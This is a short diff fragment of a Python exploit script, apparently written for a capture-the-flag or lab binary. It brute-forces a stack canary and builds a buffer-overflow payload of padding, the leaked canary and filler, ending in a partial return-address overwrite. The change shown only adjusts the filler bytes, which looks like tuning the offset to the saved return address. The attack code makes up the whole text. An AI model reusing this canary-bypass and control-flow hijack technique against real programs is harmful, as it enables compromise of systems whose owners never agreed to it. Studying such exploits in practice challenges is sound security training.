@@ -16,7 +16,7 @@ for length in range(33, 37):
             canary += chr(i)
             break
 
-payload = 'a' * 32 + canary + 'a' * 16 + '\xed\x07'
+payload = 'a' * 32 + canary + 'b' * 12 + 'c' * 4 + '\xed\x07'
 strlenOfPayload = str(len(payload))
 
 while True:
